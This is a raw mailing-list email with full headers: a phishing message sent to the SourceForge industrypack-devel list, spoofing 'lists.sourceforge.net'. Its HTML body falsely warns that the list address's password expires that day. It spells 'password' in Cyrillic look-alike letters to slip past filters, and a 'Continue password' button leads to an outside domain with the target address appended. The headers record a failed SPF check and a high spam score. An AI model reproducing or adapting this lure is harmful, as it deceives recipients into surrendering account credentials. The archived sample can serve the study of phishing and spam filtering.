Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 69BD03DA3B7
	for <lists+industrypack-devel@lfdr.de>; Thu, 29 Jul 2021 15:16:10 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.90_1)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1m95tR-0001xq-7Q
	for lists+industrypack-devel@lfdr.de; Thu, 29 Jul 2021 13:16:09 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
 (envelope-from <jsapirman@tigerpaw.com>) id 1m95tP-0001xf-4r
 for industrypack-devel@lists.sourceforge.net; Thu, 29 Jul 2021 13:16:07 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=3HVfZP68iGSyF1qezl2yewV6mLCoNj2sCqQY5qlmvf4=; b=easLCEDlYO06255uxajL3UP1UW
 l4nfP0I0qLImKS/4g3Whz/L47q9lyOk4kyj4j9dUiqs0heKKsySANPl/yJiyXM312bHB6Lt3GH6FV
 3yu/NmS9m4ouDHqb/rmFgJlxwblaf3dO6Ipq/rx2lYTE9+EZegy6CbtVbB36kkuf3RXU=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=3HVfZP68iGSyF1qezl2yewV6mLCoNj2sCqQY5qlmvf4=; b=f
 6SmDEqZvBvZbJBZpewhvbtFIiXZvu3DCOS7q7NeVCCMFx/VWcLDTAgnfKtgYYCgRcaf7L9XefnEHl
 aWQ0+CHE6M0yK7Aoo0EsNbS7sxow2g8n2XZKufsAs/TpuKVzwi646o7S/03depD4oKuJR/0mWSxFG
 fRILJXWPnssWN6WA=;
Received: from [159.203.16.115] (helo=mta0.strapack.co.jp)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.3)
 id 1m95tG-0001HW-Kz
 for industrypack-devel@lists.sourceforge.net; Thu, 29 Jul 2021 13:16:06 +0000
From: lists.sourceforge.net<jsapirman@tigerpaw.com>
To: industrypack-devel@lists.sourceforge.net
Date: 29 Jul 2021 05:55:45 -0700
Message-ID: <20210729055544.57013946193641E3@tigerpaw.com>
MIME-Version: 1.0
X-Spam-Score: 6.4 (++++++)
X-Spam-Report: Spam Filtering performed by mx.sourceforge.net.
 See http://spamassassin.org/tag/ for more details.
 -0.0 RCVD_IN_MSPIKE_H2      RBL: Average reputation (+2)
 [159.203.16.115 listed in wl.mailspike.net]
 0.0 URIBL_BLOCKED ADMINISTRATOR NOTICE: The query to URIBL was blocked.
 See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: totaldiagnosticscare.com]
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.9 SPF_FAIL               SPF: sender does not match SPF record (fail)
 [SPF failed: Please see http://www.openspf.net/Why?s=mfrom;
 id=jsapirman%40tigerpaw.com; ip=159.203.16.115;
 r=util-malware-3.v13.lw.sourceforge.com]
 1.0 HTML_MESSAGE           BODY: HTML included in message
 2.3 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 1.0 RDNS_NONE Delivered to internal network by a host with no rDNS
 0.0 FROM_MISSP_SPF_FAIL    No description available.
 1.2 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML only
X-Headers-End: 1m95tG-0001HW-Kz
Subject: [Industrypack-devel] industrypack-devel@lists.sourceforge.net
 locked Out 7/29/2021 5:55:44 a.m.
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============3159296934457625104=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============3159296934457625104==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!doctype html>
<html>
<head>
	<title></title>
	<meta content=3D"text/html; charset=3Diso-8859-1" http-equiv=3D"Content-Ty=
pe" />
</head>
<body>
<div style=3D"font-size: 13px; font-family: &quot;Google Sans&quot;, Roboto=
, RobotoDraft, Helvetica, Arial, sans-serif; border-bottom: thin solid rgb(=
218, 220, 224); color: rgba(0, 0, 0, 0.87); line-height: 32px; padding-bott=
om: 24px; text-align: center; word-break: break-word;">
<div style=3D"font-size: 24px;">
<p style=3D"font-family: Arial, Helvetica, sans-serif; color: rgb(32, 31, 3=
0); font-size: 15px;"><span style=3D"font-size:20px;"><span style=3D"color:=
#0000FF;">lists.sourceforge.net</span></span></p>

<p style=3D"font-family: Arial, Helvetica, sans-serif; color: rgb(32, 31, 3=
0); font-size: 15px;">&#1088;&#1072;&#1109;&#1109;&#1309;&#1086;r&#1281; fo=
r&nbsp;<font color=3D"#0000f4">industrypack-devel@lists.sourceforge.net</fo=
nt>&nbsp;is due to &#1077;xpir&#1077; 7/29/2021 5:55:44 a.m..</p>

<p style=3D"font-family: Arial, Helvetica, sans-serif; color: rgb(32, 31, 3=
0); font-size: 15px;"><br />
<a href=3D"https://totaldiagnosticscare.com/ger/hostpointed/#industrypack-d=
evel@lists.sourceforge.net" rel=3D"noopener noreferrer noreferrer" style=3D=
"color: white; margin: 0px; padding: 8px; border: 0px; font-style: inherit;=
 font-variant: inherit; font-weight: inherit; font-stretch: inherit; line-h=
eight: inherit; font-family: inherit; vertical-align: baseline; background-=
color: rgb(42, 126, 251); text-decoration-line: none;" target=3D"_blank">Co=
ntinue &#1088;&#1072;&#1109;&#1109;&#1309;&#1086;r&#1281;</a><br />
<span style=3D"margin: 0px; padding: 0px; border: 0px; font: inherit; verti=
cal-align: baseline; color: inherit;">&nbsp;</span></p>

<p style=3D"font-family: Arial, Helvetica, sans-serif; color: rgb(32, 31, 3=
0); font-size: 15px;">Do not ignore this email so you do not get locked out=
 of your account.</p>

<p style=3D"font-family: Arial, Helvetica, sans-serif; color: rgb(32, 31, 3=
0); font-size: 15px;">Thanks</p>

<p style=3D"font-family: Arial, Helvetica, sans-serif; color: rgb(32, 31, 3=
0); font-size: 15px;">lists.sourceforge.net Team</p>

<hr style=3D"font-family: Arial, Helvetica, sans-serif; color: rgb(32, 31, =
30); font-size: 15px;" /></div>
</div>

<div style=3D"font-family: -apple-system, system-ui, &quot;Helvetica Neue&q=
uot;, &quot;Segoe UI&quot;, Arial, sans-serif; padding-top: 20px; font-size=
: 12px; line-height: 16px; color: rgb(95, 99, 104); letter-spacing: 0.3px; =
text-align: center;">&nbsp;</div>
</body>
</html>


--===============3159296934457625104==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============3159296934457625104==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============3159296934457625104==--
